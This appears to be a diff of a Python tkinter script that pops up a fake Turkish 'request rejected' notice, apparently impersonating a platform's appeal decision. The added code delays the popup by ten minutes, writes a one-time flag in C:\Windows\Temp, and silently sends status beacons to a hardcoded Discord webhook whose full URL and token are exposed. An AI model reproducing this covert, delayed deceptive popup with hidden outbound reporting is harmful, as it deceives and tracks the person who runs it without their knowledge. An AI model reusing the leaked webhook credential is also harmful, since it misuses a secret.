@@ -1,5 +1,19 @@
 import os
+import time
 import tkinter as tk
+import requests
+
+# ==========================================
+# WEBHOOK URL
+# ==========================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+
+def send_notification(message):
+    try:
+        payload = {"content": f"**[PANEL BİLDİRİM]** {message}"}
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
 
 # ==========================================
 # FLAG KONTROLÜ (1 defa açılsın)
@@ -7,8 +21,19 @@ import tkinter as tk
 FLAG = "C:\\Windows\\Temp\\panel_gosterildi.flag"
 
 if os.path.exists(FLAG):
-    pass
+    send_notification("⏭️ Panel zaten gösterildi, atlanıyor.")
 else:
+    send_notification("⏳ 10 dakika bekleniyor...")
+    
+    # ==========================================
+    # 10 DAKİKA BEKLE
+    # ==========================================
+    time.sleep(600)  # 10 dakika
+    send_notification("⏰ 10 dakika doldu! Panel açılıyor...")
+
+    # ==========================================
+    # PANEL OLUŞTUR
+    # ==========================================
     window = tk.Tk()
     window.title("Talep Reddedildi!")
     window.geometry("500x350")
@@ -28,9 +53,8 @@ else:
     aciklama = (
         "Sayın kullanıcı,\n\n"
         "Tarafınızdan gönderilen talep, kanıtlar dahilinde incelenmiştir.\n"
-        "Yapılan incelemeler sonucunda, itiraz yapılan IP adresi\n"
-        "ile hesabınızda kayıtlı IP adresleri aynıdır.\n\n"
-        "Ancak yapılan diğer kontrollerde talebiniz uygun bulunmamıştır.\n"
+        "Yapılan incelemeler sonucunda, gönderilen mesajların IP adresi\n"
+        "ile hesabınızda kayıtlı IP adresleri uyuşmamaktadır.\n\n"
         "Bu nedenle talebiniz reddedilmiştir.\n\n"
         "İyi günler dileriz."
     )
@@ -48,6 +72,7 @@ else:
         with open(FLAG, "w") as f:
             f.write("GÖSTERİLDİ")
         window.destroy()
+        send_notification("✅ Panel kapatıldı, flag oluşturuldu.")
     
     tk.Button(
         window,
@@ -59,4 +84,5 @@ else:
         width=15
     ).pack(pady=15)
     
+    send_notification("🪟 Panel açıldı, kullanıcı bekleniyor...")
     window.mainloop()
